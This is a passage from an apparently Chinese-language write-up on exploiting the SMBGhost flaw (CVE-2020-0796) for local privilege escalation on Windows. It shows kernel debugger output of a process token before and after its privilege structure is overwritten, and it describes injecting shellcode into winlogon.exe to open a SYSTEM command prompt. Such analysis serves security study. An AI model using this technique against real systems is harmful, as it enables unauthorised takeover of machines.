 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default

```

下面分别是进程原来的特权和修改 SEP_TOKEN_PRIVILEGES 结构提权后进程的特权。可以发现，提权后，该进程已经拥有了绝大多数 [特权](https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN)，并且全部 Enabled。

```
3: kd> !process 0 1 cve-2020-0796-local.exe
PROCESS ffffde86503b7080
    SessionId: 1  Cid: 1664    Peb: d4198a4000  ParentCid: 1100
    DirBase: 74442002  ObjectTable: ffffa28d1f5fed80  HandleCount:  51.
    Image: cve-2020-0796-local.exe
    VadRoot ffffde865081d740 Vads 34 Clone 0 Private 872. Modified 1. Locked 0.
    DeviceMap ffffa28d1e608290
    Token                             ffffa28d201ee670
    ElapsedTime                       00:00:00.591
    UserTime                          00:00:00.000
    KernelTime                        00:00:00.000
    QuotaPoolUsage[PagedPool]         30512
    QuotaPoolUsage[NonPagedPool]      5880
    Working Set Sizes (now,min,max)  (1498, 50, 345) (5992KB, 200KB, 1380KB)
    PeakWorkingSetSize                1456
    VirtualSize                       4149 Mb
    PeakVirtualSize                   4149 Mb
    PageFaultCount                    1500
    MemoryPriority                    BACKGROUND
    BasePriority                      8
    CommitCharge                      898
    Job                               ffffde864ffb8060
3: kd> !token ffffa28d201ee670
_TOKEN 0xffffa28d201ee670
TS Session ID: 0x1
User: S-1-5-21-3327071095-2940766009-4284547822-1001
User Groups: 
 00 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-114
    Attributes - DenyOnly 
 03 S-1-5-32-544
    Attributes - DenyOnly 
 04 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 05 S-1-5-4
    Attributes - Mandatory Default Enabled 
 06 S-1-2-1
    Attributes - Mandatory Default Enabled 
 07 S-1-5-11
    Attributes - Mandatory Default Enabled 
 08 S-1-5-15
    Attributes - Mandatory Default Enabled 
 09 S-1-11-96-3623454863-58364-18864-2661722203-1597581903-1364412369-3236974559-3067464898-3937708078-811530852
    Attributes - Mandatory Default Enabled 
 10 S-1-5-113
    Attributes - Mandatory Default Enabled 
 11 S-1-5-5-0-506001
    Attributes - Mandatory Default Enabled LogonId 
 12 S-1-2-0
    Attributes - Mandatory Default Enabled 
 13 S-1-5-64-36
    Attributes - Mandatory Default Enabled 
Primary Group: S-1-5-21-3327071095-2940766009-4284547822-1001
Privs: 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes - 
Authentication ID:         (0,7bc1d)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 (Token in use)
Token ID: 142b23           ParentToken ID: 0
Modified ID:               (0, 7bc2a)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink
Process Token TrustLevelSid: (null)
3: kd> !token ffffa28d201ee670
_TOKEN 0xffffa28d201ee670
TS Session ID: 0x1
User: S-1-5-21-3327071095-2940766009-4284547822-1001
User Groups: 
 00 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-114
    Attributes - DenyOnly 
 03 S-1-5-32-544
    Attributes - DenyOnly 
 04 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 05 S-1-5-4
    Attributes - Mandatory Default Enabled 
 06 S-1-2-1
    Attributes - Mandatory Default Enabled 
 07 S-1-5-11
    Attributes - Mandatory Default Enabled 
 08 S-1-5-15
    Attributes - Mandatory Default Enabled 
 09 S-1-11-96-3623454863-58364-18864-2661722203-1597581903-1364412369-3236974559-3067464898-3937708078-811530852
    Attributes - Mandatory Default Enabled 
 10 S-1-5-113
    Attributes - Mandatory Default Enabled 
 11 S-1-5-5-0-506001
    Attributes - Mandatory Default Enabled LogonId 
 12 S-1-2-0
    Attributes - Mandatory Default Enabled 
 13 S-1-5-64-36
    Attributes - Mandatory Default Enabled 
Primary Group: S-1-5-21-3327071095-2940766009-4284547822-1001
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - Enabled 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - Enabled 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - Enabled 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled 
 08 0x000000008 SeSecurityPrivilege               Attributes - Enabled 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled 
 12 0x00000000c SeSystemtimePrivilege             Attributes - Enabled 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled 
 17 0x000000011 SeBackupPrivilege                 Attributes - Enabled 
 18 0x000000012 SeRestorePrivilege                Attributes - Enabled 
 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - Enabled 
 28 0x00000001c SeManageVolumePrivilege           Attributes - Enabled 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - Enabled 
 32 0x000000020 SeRelabelPrivilege                Attributes - Enabled 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled 
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled 
Authentication ID:         (0,7bc1d)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: 142b23           ParentToken ID: 0
Modified ID:               (0, 7bc2a)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink
Process Token TrustLevelSid: (null)

```

由于程序已经获得了 SeDebugPrivilege 特权，因而可通过向 winlogon.exe 程序注入 shellcode 来进行下一步操作，在此 shellcode 中最终会调用 WinExec(“cmd”，1)，从而以 system 权限打开 cmd 窗口。

```
0033:00000151`719d005d ffd7     call    rdi {KERNEL32!WinExec (00007ffb`6e53e800)}
0033:00000151`719d005f 4883c430 add     rsp, 30h
0033:00000151`719d0063 5d       pop     rbp
0033:00000151`719d0064 5f       pop     rdi
0033:00000151`719d0065 5e       pop     rsi
2: kd> 
0033:00000151`719d005d ffd7            call    rdi
2: kd> db rcx
00000041`398ff888  63 6d 64 00 00 00 00 00-00 00 00 00 00 00 00 00  cmd.............
2: kd> r rdx
rdx=0000000000000001

```

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs49fPBuu4BXiaQ4ISrLqp9W1e5Sd2eBWMltgGZn6UHKeMxGP3RRSV0NO2t6BwHB5xCiaXMbicjExyT92w/640?wx_fmt=png)

**参考文章**

https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html

https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/

https://paper.seebug.org/1164/

https://mp.weixin.qq.com/s/hhmDz9-37EBbL8mlgnLi4A

https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN

https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf

https://www.chainnews.com/articles/235747795743.htm